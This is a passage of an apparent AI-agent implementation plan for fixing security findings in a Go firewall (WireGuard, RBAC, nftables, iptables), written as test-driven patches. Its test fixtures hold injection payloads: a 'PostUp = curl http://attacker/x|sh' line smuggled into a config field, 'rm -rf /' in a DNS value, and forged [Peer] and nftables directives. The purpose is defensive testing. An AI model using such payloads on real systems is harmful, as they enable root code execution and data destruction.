# Correção dos achados da revisão de segurança Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Corrigir os 18 achados acionáveis da revisão de segurança de 2026-07-29 (2 Critical, 7
Important, 9 Minor — o 19º achado, integridade de update, foi explicitamente aceito, sem ação).

**Architecture:** Cada achado vira uma correção pontual e testada no arquivo onde o problema mora —
sem refatoração maior, sem mudança de arquitetura. As duas exceções que tocam mais de um arquivo são
o achado #6 (revogação de token, que precisa de uma coluna nova no banco + campo no JWT + checagem no
middleware) e o achado sistêmico de erro cru (69 call sites, uma transformação mecânica idêntica em
todos).

**Tech Stack:** Go 1.25 (stdlib `net`, `regexp`, `net/http`; sem dependência nova). Frontend só muda
onde uma validação de UI precisa espelhar a nova regra do backend (assistente WAN) ou onde um campo
inseguro é removido (WhatsApp URL).

## Global Constraints

- Toda correção precisa de teste que comprova o comportamento ANTES (vulnerável) e DEPOIS (corrigido)
  — TDD real, padrão já estabelecido no backend deste projeto.
- Nenhuma correção pode quebrar um fluxo legítimo já existente — cada task inclui, além do teste do
  bug, a confirmação de que o caso de uso legítimo correspondente continua funcionando.
- PATH do Go: `export PATH="/home/gov/sdk/go1.25.0/bin:$PATH"`. PATH do Node:
  `export PATH="$HOME/.nvm/versions/node/v22.21.1/bin:$PATH"`.
- Mensagens de erro voltadas ao operador em português, consistente com o resto do código.
- Nenhuma correção deste plano deve alterar o formato de armazenamento de segredos existentes de um
  jeito que invalide dados já persistidos (backups antigos, senhas já cadastradas) — ver task 10
  (versionamento do formato do backup) como o exemplo mais delicado disso.

---

### Task 1 (CRITICAL): Validação dos campos do WireGuard

**Files:**
- Modify: `internal/wireguard/wireguard.go`
- Modify: `internal/api/handlers/vpn.go`
- Test: `internal/wireguard/wireguard_test.go` (criar se não existir)

**Interfaces:**
- Produces: `func ValidateConfig(c Config) error` e `func ValidatePeerName(name string) error`,
  exportados de `internal/wireguard`, usados pelo handler antes de `Apply`/`save`.

- [ ] **Step 1: Escrever os testes que falham**

```go
// internal/wireguard/wireguard_test.go
package wireguard

import "testing"

func TestValidateConfigRejectsNewlineInAddress(t *testing.T) {
	c := Defaults()
	c.Address = "10.7.0.1/24\nPostUp = curl http://attacker/x|sh\n"
	if err := ValidateConfig(c); err == nil {
		t.Fatal("expected error for Address with embedded newline, got nil")
	}
}

func TestValidateConfigAcceptsValidAddress(t *testing.T) {
	c := Defaults()
	if err := ValidateConfig(c); err != nil {
		t.Fatalf("expected Defaults() to be valid, got: %v", err)
	}
}

func TestValidateConfigRejectsMalformedSubnet(t *testing.T) {
	c := Defaults()
	c.Subnet = "not-a-cidr"
	if err := ValidateConfig(c); err == nil {
		t.Fatal("expected error for malformed subnet, got nil")
	}
}

func TestValidateConfigRejectsMalformedDNS(t *testing.T) {
	c := Defaults()
	c.DNS = "10.7.0.1; rm -rf /"
	if err := ValidateConfig(c); err == nil {
		t.Fatal("expected error for malformed DNS, got nil")
	}
}

func TestValidateConfigAcceptsHostnameEndpoint(t *testing.T) {
	c := Defaults()
	c.Endpoint = "meufirewall.duckdns.org"
	if err := ValidateConfig(c); err != nil {
		t.Fatalf("expected hostname endpoint to be valid, got: %v", err)
	}
}

func TestValidateConfigRejectsMalformedEndpoint(t *testing.T) {
	c := Defaults()
	c.Endpoint = "not a hostname\nPostUp = evil"
	if err := ValidateConfig(c); err == nil {
		t.Fatal("expected error for malformed endpoint, got nil")
	}
}

func TestValidatePeerNameRejectsNewline(t *testing.T) {
	if err := ValidatePeerName("Meu celular\n[Peer]\nPublicKey = attacker-key\nAllowedIPs = 0.0.0.0/0"); err == nil {
		t.Fatal("expected error for peer name with embedded newline/peer-block injection, got nil")
	}
}

func TestValidatePeerNameAcceptsAccentedName(t *testing.T) {
	if err := ValidatePeerName("João - Notebook"); err != nil {
		t.Fatalf("expected accented name to be valid, got: %v", err)
	}
}

func TestValidatePeerNameRejectsEmpty(t *testing.T) {
	if err := ValidatePeerName(""); err == nil {
		t.Fatal("expected error for empty name, got nil")
	}
}
```

- [ ] **Step 2: Rodar os testes e confirmar que falham**

Run: `export PATH="/home/gov/sdk/go1.25.0/bin:$PATH" && go test ./internal/wireguard/... -run 'TestValidate' -v`
Expected: FAIL — `undefined: ValidateConfig` / `undefined: ValidatePeerName`.

- [ ] **Step 3: Implementar**

Adicionar ao final de `internal/wireguard/wireguard.go` (não remove nada existente):

```go
var peerNameRe = regexp.MustCompile(`^[\p{L}\p{N} ._-]{1,64}$`)

// ValidatePeerName rejects anything that isn't a safe display label. Peer.Name
// is rendered as a bare "# %s\n" comment line in ServerConfig() — an embedded
// newline would close the comment and let an attacker inject an entirely new
// [Peer] block (or any other wg0.conf directive) that wg-quick then applies as
// root on the next restart.
func ValidatePeerName(name string) error {
	if !peerNameRe.MatchString(name) {
		return fmt.Errorf("nome do cliente inválido — use letras, números, espaço, ponto, hífen ou underscore (1-64 caracteres)")
	}
	return nil
}

var endpointRe = regexp.MustCompile(`^[a-zA-Z0-9]([a-zA-Z0-9-]{0,62}[a-zA-Z0-9])?(\.[a-zA-Z0-9]([a-zA-Z0-9-]{0,62}[a-zA-Z0-9])?)*$`)

// ValidateConfig rejects any server-config field that could break out of its
// slot when ServerConfig() renders wg0.conf. Address is the field that
// actually reaches wg0.conf (Endpoint/DNS only reach the client .conf
// returned to the browser, not this server's own config) — all four are
// validated for defense in depth and because the original spec already
// expected a real format here.
func ValidateConfig(c Config) error {
	if c.Address != "" {
		if _, _, err := net.ParseCIDR(c.Address); err != nil {
			return fmt.Errorf("endereço do servidor inválido (use CIDR, ex.: 10.7.0.1/24): %w", err)
		}
	}
	if c.Subnet != "" {
		if _, _, err := net.ParseCIDR(c.Subnet); err != nil {
			return fmt.Errorf("sub-rede inválida (use CIDR, ex.: 10.7.0.0/24): %w", err)
		}
	}
	if c.DNS != "" && net.ParseIP(c.DNS) == nil {
		return fmt.Errorf("DNS inválido (use um endereço IP)")
	}
	if c.Endpoint != "" && net.ParseIP(c.Endpoint) == nil && !endpointRe.MatchString(c.Endpoint) {
		return fmt.Errorf("endpoint inválido (use um IP ou hostname, ex.: meufirewall.duckdns.org)")
	}
	return nil
}
```

Adicionar aos imports de `internal/wireguard/wireguard.go`: `"net"` (se ainda não estiver) e
`"regexp"`.

Em `internal/api/handlers/vpn.go`, em `UpdateConfig` (função existente), inserir a validação logo
depois de montar `c` e antes de gerar chaves/aplicar — troque:

```go
	c.Endpoint = strings.TrimSpace(in.Endpoint)
	c.DNS = strings.TrimSpace(in.DNS)
	c.Enabled = in.Enabled

	// Generate the server keypair the first time it is needed.
```

por:

```go
	c.Endpoint = strings.TrimSpace(in.Endpoint)
	c.DNS = strings.TrimSpace(in.DNS)
	c.Enabled = in.Enabled

	if err := wireguard.ValidateConfig(c); err != nil {
		writeError(w, http.StatusBadRequest, err.Error())
		return
	}

	// Generate the server keypair the first time it is needed.
```

Em `AddPeer` (mesmo arquivo), troque:

```go
	if err := decodeJSON(r, &in); err != nil || strings.TrimSpace(in.Name) == "" {
		writeError(w, http.StatusBadRequest, "nome do cliente é obrigatório")
		return
	}
```

por:

```go
	if err := decodeJSON(r, &in); err != nil {
		writeError(w, http.StatusBadRequest, "corpo inválido")
		return
	}
	name := strings.TrimSpace(in.Name)
	if err := wireguard.ValidatePeerName(name); err != nil {
		writeError(w, http.StatusBadRequest, err.Error())
		return
	}
```

E logo abaixo, troque a linha que usa `strings.TrimSpace(in.Name)` na construção do `peer` por `name`
(já validado):

```go
	peer := wireguard.Peer{
		ID:         uuid.NewString(),
		Name:       name,
```

- [ ] **Step 4: Rodar os testes e confirmar que passam**

Run: `export PATH="/home/gov/sdk/go1.25.0/bin:$PATH" && go test ./internal/wireguard/... ./internal/api/handlers/... -v`
Expected: PASS — todos os testes novos, e os testes pré-existentes de `vpn_test.go` (se houver)
continuam passando (confirmando que um `Address`/`Name` legítimo, ex. `"10.7.0.1/24"`/`"Meu celular"`,
ainda é aceito).

- [ ] **Step 5: Commit**

```bash
git add internal/wireguard/ internal/api/handlers/vpn.go
git commit -m "fix(vpn): validar campos do WireGuard antes de escrever wg0.conf (RCE via PostUp)"
```

---

### Task 2 (CRITICAL): Bloquear auto-promoção via `users.manage`

**Files:**
- Modify: `internal/api/handlers/users.go`
- Test: `internal/api/handlers/users_test.go` (criar se não existir, senão estender)

**Interfaces:**
- Consumes: `auth.PermRolesManage`, `auth.ClaimsFromContext`, `db.GetUserPermissions` (já existem).

- [ ] **Step 1: Escrever o teste que falha**

Verifique primeiro se `internal/api/handlers/users_test.go` já existe (`ls
internal/api/handlers/users_test.go`). Se não existir, crie com o conteúdo abaixo; se existir,
adicione as duas funções de teste ao final do arquivo (mantendo os imports já presentes + os que
faltarem desta lista).

```go
// internal/api/handlers/users_test.go
package handlers_test

import (
	"bytes"
	"encoding/json"
	"net/http"
	"net/http/httptest"
	"path/filepath"
	"testing"

	"github.com/giovanibalarini/linkguard-fw/internal/api/handlers"
	"github.com/giovanibalarini/linkguard-fw/internal/auth"
	"github.com/giovanibalarini/linkguard-fw/internal/storage"
)

func newUsersTestHandler(t *testing.T) (*handlers.UsersHandler, *storage.DB) {
	t.Helper()
	dir := t.TempDir()
	db, err := storage.Open(filepath.Join(dir, "test.db"))
	if err != nil {
		t.Fatalf("Open: %v", err)
	}
	t.Cleanup(func() { db.Close() })
	return handlers.NewUsersHandler(db), db
}

// helpdeskOnlyUser creates a role with ONLY users.manage (no roles.manage) and
// a user assigned to it — the exact "limited helpdesk account" scenario the
// vulnerability targets.
func helpdeskOnlyUser(t *testing.T, db *storage.DB) *storage.User {
	t.Helper()
	role := &storage.Role{Name: "Helpdesk", Permissions: []string{string(auth.PermUsersManage)}}
	if err := db.CreateRole(role); err != nil {
		t.Fatalf("CreateRole: %v", err)
	}
	u := &storage.User{Username: "helpdesk"}
	if err := db.CreateUser(u, "$2a$10$fakehashfakehashfakehashfakehashfakehashfakehashfa", []string{role.ID}); err != nil {
		t.Fatalf("CreateUser: %v", err)
	}
	return u
}

func adminRoleID(t *testing.T, db *storage.DB) string {
	t.Helper()
	role := &storage.Role{Name: "Admin de verdade", Permissions: []string{string(auth.PermRolesManage), string(auth.PermUsersManage)}}
	if err := db.CreateRole(role); err != nil {
		t.Fatalf("CreateRole: %v", err)
	}
	return role.ID
}

func TestUpdateBlocksSelfPromotionWithoutRolesManage(t *testing.T) {
	h, db := newUsersTestHandler(t)
	attacker := helpdeskOnlyUser(t, db)
	adminRole := adminRoleID(t, db)

	body, _ := json.Marshal(map[string]interface{}{"role_ids": []string{adminRole}})
	req := httptest.NewRequest(http.MethodPut, "/api/users/"+attacker.ID, bytes.NewReader(body))
	req = req.WithContext(auth.ContextWithClaims(req.Context(), &auth.Claims{UserID: attacker.ID, Username: attacker.Username}))
	req = withChiURLParam(req, "id", attacker.ID)
	w := httptest.NewRecorder()
	h.Update(w, req)

	if w.Code != http.StatusForbidden {
		t.Fatalf("expected 403 (roles.manage required), got %d: %s", w.Code, w.Body.String())
	}
	roleIDs, err := db.GetUserRoleIDs(attacker.ID)
	if err != nil {
		t.Fatalf("GetUserRoleIDs: %v", err)
	}
	for _, rid := range roleIDs {
		if rid == adminRole {
			t.Fatal("attacker's role_ids were changed despite the 403 — self-promotion succeeded")
		}
	}
}

func TestUpdatePasswordOnlyDoesNotRequireRolesManage(t *testing.T) {
	h, db := newUsersTestHandler(t)
	attacker := helpdeskOnlyUser(t, db)

	body, _ := json.Marshal(map[string]interface{}{"password": "novaSenhaForte123"})
	req := httptest.NewRequest(http.MethodPut, "/api/users/"+attacker.ID, bytes.NewReader(body))
	req = req.WithContext(auth.ContextWithClaims(req.Context(), &auth.Claims{UserID: attacker.ID, Username: attacker.Username}))
	req = withChiURLParam(req, "id", attacker.ID)
	w := httptest.NewRecorder()
	h.Update(w, req)

	if w.Code != http.StatusOK {
		t.Fatalf("expected 200 for password-only update (no role change), got %d: %s", w.Code, w.Body.String())
	}
}

func TestUpdateWithRolesManageCanChangeRoles(t *testing.T) {
	h, db := newUsersTestHandler(t)
	actorRole := adminRoleID(t, db)
	actor := &storage.User{Username: "real-admin"}
	if err := db.CreateUser(actor, "$2a$10$fakehashfakehashfakehashfakehashfakehashfakehashfa", []string{actorRole}); err != nil {
		t.Fatalf("CreateUser: %v", err)
	}
	target := helpdeskOnlyUser(t, db)

	body, _ := json.Marshal(map[string]interface{}{"role_ids": []string{actorRole}})
	req := httptest.NewRequest(http.MethodPut, "/api/users/"+target.ID, bytes.NewReader(body))
	req = req.WithContext(auth.ContextWithClaims(req.Context(), &auth.Claims{UserID: actor.ID, Username: actor.Username}))
	req = withChiURLParam(req, "id", target.ID)
	w := httptest.NewRecorder()
	h.Update(w, req)

	if w.Code != http.StatusOK {
		t.Fatalf("expected 200 — actor holds roles.manage, legitimate role change, got %d: %s", w.Code, w.Body.String())
	}
}
```

Este teste usa dois helpers que provavelmente ainda não existem — `auth.ContextWithClaims` e
`withChiURLParam`. Confira primeiro se já existem (`grep -rn "ContextWithClaims\|withChiURLParam"
internal/`). Se `auth.ContextWithClaims` não existir, adicione-o a `internal/auth/middleware.go`
(contraparte pública de `claimsKey`, útil pra testes de handler injetarem claims sem passar pelo
`Middleware` HTTP real):

```go
// ContextWithClaims returns a context carrying the given claims, for tests
// that call a handler directly without going through Middleware.
func ContextWithClaims(ctx context.Context, c *Claims) context.Context {
	return context.WithValue(ctx, claimsKey, c)
}
```

Se `withChiURLParam` não existir em nenhum `_test.go` do pacote `handlers_test`, adicione este helper
ao novo `users_test.go` (ou reaproveite se outro arquivo do pacote já tiver um idêntico — neste caso
delete a duplicata do seu arquivo):

```go
func withChiURLParam(r *http.Request, key, value string) *http.Request {
	rctx := chi.NewRouteContext()
	rctx.URLParams.Add(key, value)
	return r.WithContext(context.WithValue(r.Context(), chi.RouteCtxKey, rctx))
}
```

(precisa de `"context"` e `"github.com/go-chi/chi/v5"` nos imports do arquivo de teste).

- [ ] **Step 2: Rodar os testes e confirmar que falham**

Run: `export PATH="/home/gov/sdk/go1.25.0/bin:$PATH" && go test ./internal/api/handlers/... -run TestUpdate -v`
Expected: FAIL — `TestUpdateBlocksSelfPromotionWithoutRolesManage` falha (recebe 200, não 403) porque
a checagem ainda não existe.

- [ ] **Step 3: Implementar**

Em `internal/api/handlers/users.go`, adicionar ao bloco de imports (se ainda não estiver lá):
`"github.com/giovanibalarini/linkguard-fw/internal/auth"` (já é usado por `auth.HashPassword`, então
já está importado — só confirme).

Trocar o início de `Update`:

```go
func (h *UsersHandler) Update(w http.ResponseWriter, r *http.Request) {
	id := chi.URLParam(r, "id")
	user, err := h.db.GetUserByID(id)
	if err != nil {
		writeError(w, http.StatusInternalServerError, err.Error())
		return
	}
	if user == nil {
		writeError(w, http.StatusNotFound, "user not found")
		return
	}

	var body struct {
		Password *string   `json:"password"`
		RoleIDs  *[]string `json:"role_ids"`
	}
	if err := decodeJSON(r, &body); err != nil {
		writeError(w, http.StatusBadRequest, "invalid request body")
		return
	}

	if body.RoleIDs != nil {
		if err := h.validateRoles(*body.RoleIDs); err != nil {
```

por:

```go
func (h *UsersHandler) Update(w http.ResponseWriter, r *http.Request) {
	id := chi.URLParam(r, "id")
	user, err := h.db.GetUserByID(id)
	if err != nil {
		writeError(w, http.StatusInternalServerError, err.Error())
		return
	}
	if user == nil {
		writeError(w, http.StatusNotFound, "user not found")
		return
	}

	var body struct {
		Password *string   `json:"password"`
		RoleIDs  *[]string `json:"role_ids"`
	}
	if err := decodeJSON(r, &body); err != nil {
		writeError(w, http.StatusBadRequest, "invalid request body")
		return
	}

	// Changing role assignments is a permission GRANT — users.manage alone (e.g.
	// a helpdesk role scoped to password resets) must not be enough to hand out
	// any role, including one that includes roles.manage/admin-equivalent
	// permissions the actor may not even hold themselves. This is deliberately
	// a blanket roles.manage requirement, not a "target role can't exceed the
	// actor's own permissions" check — simpler, and matches the separation the
	// two permissions already imply.
	if body.RoleIDs != nil {
		claims := auth.ClaimsFromContext(r.Context())
		if claims == nil {
			writeError(w, http.StatusUnauthorized, "unauthorized")
			return
		}
		perms, err := h.db.GetUserPermissions(claims.UserID)
		if err != nil {
			writeError(w, http.StatusInternalServerError, err.Error())
			return
		}
		if !perms[string(auth.PermRolesManage)] {
			writeError(w, http.StatusForbidden, "alterar papéis de um usuário exige a permissão roles.manage")
			return
		}
	}

	if body.RoleIDs != nil {
		if err := h.validateRoles(*body.RoleIDs); err != nil {
```

(O restante da função — `guardLastAdmin`, `SetUserRoles`, o bloco de `Password` — fica exatamente
como está, só a checagem nova foi inserida antes do `validateRoles` já existente.)

- [ ] **Step 4: Rodar os testes e confirmar que passam**

Run: `export PATH="/home/gov/sdk/go1.25.0/bin:$PATH" && go test ./internal/api/handlers/... -v`
Expected: PASS — os 3 testes novos, e o resto da suíte do pacote `handlers` continua passando (a
rota `PUT /api/users/{id}` já exigia `users.manage` no router — isso não muda; a checagem nova é
adicional, dentro do handler, só quando `role_ids` está presente no corpo).

- [ ] **Step 5: Commit**

```bash
git add internal/api/handlers/users.go internal/api/handlers/users_test.go internal/auth/middleware.go
git commit -m "fix(rbac): exigir roles.manage pra alterar role_ids (bloqueia auto-promoção)"
```

---

### Task 3 (IMPORTANT): Validar `PortForward.Interface`

**Files:**
- Modify: `internal/nftables/service.go`
- Test: `internal/nftables/service_test.go` (estender se já existir, senão criar)

- [ ] **Step 1: Escrever o teste que falha**

Adicionar a `internal/nftables/service_test.go` (mesmo pacote `nftables`, branco-caixa — confira o
`package` declarado no topo do arquivo existente e siga o mesmo; se o arquivo não existir, crie com
`package nftables`):

```go
func TestDnatRuleRejectsMalformedInterface(t *testing.T) {
	f := PortForward{
		Proto: "tcp", ExtPort: 8080, DestIP: "192.168.1.10", DestPort: 80,
		Interface: `wan" ; add rule inet fw forward accept #`,
	}
	if _, err := dnatRule(f); err == nil {
		t.Fatal("expected error for interface with embedded quote/semicolon, got nil")
	}
}

func TestDnatRuleAcceptsValidInterface(t *testing.T) {
	f := PortForward{
		Proto: "tcp", ExtPort: 8080, DestIP: "192.168.1.10", DestPort: 80,
		Interface: "enp3s0",
	}
	if _, err := dnatRule(f); err != nil {
		t.Fatalf("expected valid interface name to be accepted, got: %v", err)
	}
}

func TestDnatRuleAcceptsEmptyInterface(t *testing.T) {
	f := PortForward{Proto: "tcp", ExtPort: 8080, DestIP: "192.168.1.10", DestPort: 80}
	if _, err := dnatRule(f); err != nil {
		t.Fatalf("expected empty interface (any) to be accepted, got: %v", err)
	}
}
```

- [ ] **Step 2: Rodar o teste e confirmar que falha**

Run: `export PATH="/home/gov/sdk/go1.25.0/bin:$PATH" && go test ./internal/nftables/... -run TestDnatRuleRejectsMalformedInterface -v`
Expected: FAIL — hoje `dnatRule` aceita qualquer string em `Interface`, então o teste não vê erro.

- [ ] **Step 3: Implementar**

Em `internal/nftables/service.go`, dentro de `dnatRule`, trocar:

```go
	var parts []string
	if iif := strings.TrimSpace(f.Interface); iif != "" {
		parts = append(parts, fmt.Sprintf("iifname %q", iif))
	}
```

por:

```go
	var parts []string
	if iif := strings.TrimSpace(f.Interface); iif != "" {
		if !reIface.MatchString(iif) {
			return "", fmt.Errorf("interface inválida: %q", iif)
		}
		parts = append(parts, fmt.Sprintf("iifname %q", iif))
	}
```

(`reIface` já existe no mesmo arquivo — `^[a-zA-Z0-9._-]{1,15}$` — é o mesmo regex que `RuleFields.
Iif`/`.Oif` já usam; nenhum import novo necessário.)

- [ ] **Step 4: Rodar os testes e confirmar que passam**

Run: `export PATH="/home/gov/sdk/go1.25.0/bin:$PATH" && go test ./internal/nftables/... -v`
Expected: PASS — os 3 testes novos e o resto da suíte do pacote.

- [ ] **Step 5: Commit**

```bash
git add internal/nftables/
git commit -m "fix(nftables): validar PortForward.Interface (mesmo charset de Iif/Oif)"
```

---

### Task 4 (IMPORTANT): `validateRuleSpec` vira allowlist + CIDR no assistente WAN

**Files:**
- Modify: `internal/iptables/service.go`
- Modify: `internal/api/handlers/iptables.go`
- Modify: `web/src/pages/Links.tsx`
- Create: `internal/iptables/validate_test.go` (white-box, `package iptables` — necessário porque
  `validateRuleSpec`/`validateTableChain` não são exportados)
- Modify: `internal/iptables/iptables_test.go` (já existe, `package iptables_test`, black-box — tem
  um fixture `mockExecutor` pronto, reaproveitado abaixo)

**Interfaces:**
- Consumes: `firewall.Executor` (3 métodos: `Execute`, `ExecuteRead`, `IsDryRun` — confirmado em
  `internal/firewall/executor.go`), `mockExecutor` já existente em `internal/iptables/
  iptables_test.go`, `NewService(exec firewall.Executor) *Service` (assinatura real confirmada).
- Produces: `validateRuleSpec` passa a retornar erro pra qualquer token fora da allowlist (assinatura
  não muda: `func validateRuleSpec(ruleSpec string) error`).
- `CreateRule`/`ReplaceRule` passam a validar `table`/`chain` contra os dois valores usados pelo
  único caller real (`mangle`/`PREROUTING`).

- [ ] **Step 1: Escrever os testes que falham**

Criar `internal/iptables/validate_test.go` (arquivo novo, `package iptables` — branco-caixa, já que
`validateRuleSpec` é função não-exportada):

```go
// internal/iptables/validate_test.go
package iptables

import "testing"

func TestValidateRuleSpecAcceptsWizardShape(t *testing.T) {
	specs := []string{
		"-s 192.168.1.0/24 -m conntrack --ctstate NEW -m statistic --mode random --probability 0.50 -j MARK --set-mark 0x1",
		"-s 192.168.1.0/24 -m conntrack --ctstate NEW -j MARK --set-mark 0x2",
	}
	for _, spec := range specs {
		if err := validateRuleSpec(spec); err != nil {
			t.Errorf("expected wizard-shaped spec to be valid, got error for %q: %v", spec, err)
		}
	}
}

func TestValidateRuleSpecRejectsExtraTarget(t *testing.T) {
	spec := "-s 192.168.1.0/24 -j TEE --gateway 1.2.3.4"
	if err := validateRuleSpec(spec); err == nil {
		t.Fatal("expected error for -j TEE (not in allowlist), got nil")
	}
}

func TestValidateRuleSpecRejectsInvalidCIDR(t *testing.T) {
	spec := "-s not-a-cidr -m conntrack --ctstate NEW -j MARK --set-mark 0x1"
	if err := validateRuleSpec(spec); err == nil {
		t.Fatal("expected error for malformed -s CIDR, got nil")
	}
}

func TestValidateRuleSpecRejectsUnknownFlag(t *testing.T) {
	spec := "-s 192.168.1.0/24 -j ACCEPT --random-unknown-flag foo"
	if err := validateRuleSpec(spec); err == nil {
		t.Fatal("expected error for unrecognized flag, got nil")
	}
}

func TestValidateTableChainAcceptsMangleprerouting(t *testing.T) {
	if err := validateTableChain("mangle", "PREROUTING"); err != nil {
		t.Fatalf("expected mangle/PREROUTING to be accepted, got: %v", err)
	}
}

func TestValidateTableChainRejectsUnknownCombination(t *testing.T) {
	if err := validateTableChain("nat", "POSTROUTING"); err == nil {
		t.Fatal("expected error for table/chain outside the allowlist, got nil")
	}
}
```

Adicionar a `internal/iptables/iptables_test.go` (arquivo já existente, `package iptables_test`,
black-box — reaproveita o `mockExecutor` já definido no topo do arquivo, sem redefinir nada):

```go
func TestCreateRuleRejectsUnknownTableChain(t *testing.T) {
	m := &mockExecutor{}
	s := iptables.NewService(m)
	_, err := s.CreateRule(context.Background(), "nat", "POSTROUTING",
		"-s 192.168.1.0/24 -j MARK --set-mark 0x1", 0)
	if err == nil {
		t.Fatal("expected error for table/chain outside the allowlist, got nil")
	}
}

func TestCreateRuleAcceptsMangleprerouting(t *testing.T) {
	m := &mockExecutor{}
	s := iptables.NewService(m)
	_, err := s.CreateRule(context.Background(), "mangle", "PREROUTING",
		"-s 192.168.1.0/24 -m conntrack --ctstate NEW -j MARK --set-mark 0x1", 0)
	if err != nil {
		t.Fatalf("expected mangle/PREROUTING to be accepted, got: %v", err)
	}
}
```

- [ ] **Step 2: Rodar os testes e confirmar que falham**

Run: `export PATH="/home/gov/sdk/go1.25.0/bin:$PATH" && go test ./internal/iptables/... -v`
Expected: FAIL — `TestValidateRuleSpecRejectsExtraTarget`, `RejectsInvalidCIDR`, `RejectsUnknownFlag`,
`TestValidateTableChainRejectsUnknownCombination` e `TestCreateRuleRejectsUnknownTableChain` falham
(a validação atual é permissiva demais); `undefined: validateTableChain` também aparece até o Step 3
ser implementado. Os testes "Accepts" já devem passar mesmo antes da correção (comportamento
legítimo não muda) — exceto os que chamam `validateTableChain`, que só existirá depois do Step 3.

- [ ] **Step 3: Implementar**

Em `internal/iptables/service.go`, adicionar aos imports: `"net"` (se ainda não estiver),
`"strconv"`.

Trocar `validateRuleSpec` inteira:

```go
func validateRuleSpec(ruleSpec string) error {
	parts := strings.Fields(strings.TrimSpace(ruleSpec))
	blockedShort := map[string]struct{}{
		"-A": {},
		"-I": {},
		"-R": {},
		"-D": {},
		"-F": {},
		"-X": {},
		"-P": {},
		"-N": {},
		"-E": {},
		"-Z": {},
	}
	blockedLong := map[string]struct{}{
		"--append":       {},
		"--insert":       {},
		"--replace":      {},
		"--delete":       {},
		"--flush":        {},
		"--delete-chain": {},
		"--policy":       {},
		"--new-chain":    {},
		"--rename-chain": {},
		"--zero":         {},
	}
	for _, token := range parts {
		if _, ok := blockedShort[token]; ok {
			return fmt.Errorf("rule_spec contains blocked operation: %s", token)
		}
		if _, ok := blockedLong[strings.ToLower(token)]; ok {
			return fmt.Errorf("rule_spec contains blocked operation: %s", token)
		}
	}
	return nil
}
```

por (allowlist — só reconhece o formato exato que o assistente de balanceamento WAN precisa; qualquer
coisa fora disso é rejeitada):

```go
var (
	allowedModules = map[string]bool{"conntrack": true, "statistic": true}
	allowedCtstate = map[string]bool{"NEW": true, "ESTABLISHED": true, "RELATED": true, "INVALID": true}
	allowedMode    = map[string]bool{"random": true, "nth": true}
	allowedTarget  = map[string]bool{"ACCEPT": true, "DROP": true, "REJECT": true, "RETURN": true, "MARK": true}
	setMarkRe      = regexp.MustCompile(`^0x[0-9a-fA-F]{1,8}$`)
)

// validateRuleSpec accepts only the exact rule shape the WAN-balance wizard
// (the sole caller of this legacy endpoint) needs to build:
//   -s <CIDR> -m conntrack --ctstate <states> [-m statistic --mode <mode> --probability <p>] -j <target> [--set-mark <hex>]
// Every token must be recognized; anything else — including match/target
// extensions not in this allowlist — rejects the whole spec. This replaces a
// denylist that only blocked rule-management flags (-A/-I/-F/...) but let
// arbitrary -j targets and unvalidated -s/-d values through as extra argv
// tokens on the real `iptables` invocation.
func validateRuleSpec(ruleSpec string) error {
	parts := strings.Fields(strings.TrimSpace(ruleSpec))
	if len(parts) == 0 {
		return fmt.Errorf("rule_spec is required")
	}
	i := 0
	next := func() (string, bool) {
		if i >= len(parts) {
			return "", false
		}
		v := parts[i]
		i++
		return v, true
	}
	for i < len(parts) {
		flag, _ := next()
		switch flag {
		case "-s", "-d":
			val, ok := next()
			if !ok {
				return fmt.Errorf("%s requires a value", flag)
			}
			if net.ParseIP(val) == nil {
				if _, _, err := net.ParseCIDR(val); err != nil {
					return fmt.Errorf("%s: endereço/CIDR inválido: %q", flag, val)
				}
			}
		case "-m":
			val, ok := next()
			if !ok || !allowedModules[val] {
				return fmt.Errorf("módulo -m não permitido: %q", val)
			}
		case "--ctstate":
			val, ok := next()
			if !ok {
				return fmt.Errorf("--ctstate requires a value")
			}
			for _, state := range strings.Split(val, ",") {
				if !allowedCtstate[state] {
					return fmt.Errorf("--ctstate não permitido: %q", state)
				}
			}
		case "--mode":
			val, ok := next()
			if !ok || !allowedMode[val] {
				return fmt.Errorf("--mode não permitido: %q", val)
			}
		case "--probability":
			val, ok := next()
			if !ok {
				return fmt.Errorf("--probability requires a value")
			}
			p, err := strconv.ParseFloat(val, 64)
			if err != nil || p < 0 || p > 1 {
				return fmt.Errorf("--probability inválida: %q", val)
			}
		case "-j":
			val, ok := next()
			if !ok || !allowedTarget[val] {
				return fmt.Errorf("alvo -j não permitido: %q", val)
			}
		case "--set-mark":
			val, ok := next()
			if !ok || !setMarkRe.MatchString(val) {
				return fmt.Errorf("--set-mark inválido: %q", val)
			}
		default:
			return fmt.Errorf("flag não reconhecida: %q", flag)
		}
	}
	return nil
}
```

Em `CreateRule` e `ReplaceRule` (mesmo arquivo), adicionar a checagem de `table`/`chain` logo depois
da checagem `table == "" || chain == ""` já existente em cada uma. Trocar (em `CreateRule`):

```go
func (s *Service) CreateRule(ctx context.Context, table, chain, ruleSpec string, line int) (string, error) {
	if table == "" || chain == "" {
		return "", fmt.Errorf("table and chain are required")
	}
	if err := validateRuleSpec(ruleSpec); err != nil {
```

por:

```go
func (s *Service) CreateRule(ctx context.Context, table, chain, ruleSpec string, line int) (string, error) {
	if err := validateTableChain(table, chain); err != nil {
		return "", err
	}
	if err := validateRuleSpec(ruleSpec); err != nil {
```

E o mesmo em `ReplaceRule`, trocando:

```go
func (s *Service) ReplaceRule(ctx context.Context, table, chain string, line int, ruleSpec string) (string, error) {
	if table == "" || chain == "" || line <= 0 {
		return "", fmt.Errorf("table, chain and valid line are required")
	}
	if err := validateRuleSpec(ruleSpec); err != nil {
```

por:

```go
func (s *Service) ReplaceRule(ctx context.Context, table, chain string, line int, ruleSpec string) (string, error) {
	if line <= 0 {
		return "", fmt.Errorf("valid line is required")
	}
	if err := validateTableChain(table, chain); err != nil {
		return "", err
	}
	if err := validateRuleSpec(ruleSpec); err != nil {
```

Adicionar a nova função helper (perto de `validateRuleSpec`):

```go
// validateTableChain restricts table/chain to the one combination the WAN-
// balance wizard (the sole caller of this legacy endpoint) actually uses.
// Extending this list is a deliberate, explicit decision for a future real
// use case — not something any caller can widen by just passing a new string.
func validateTableChain(table, chain string) error {
	if table == "mangle" && chain == "PREROUTING" {
		return nil
	}
	return fmt.Errorf("table/chain não suportados: %s/%s", table, chain)
}
```

Em `web/src/pages/Links.tsx`, adicionar validação de CIDR ao campo `wizardLan` antes de montar a
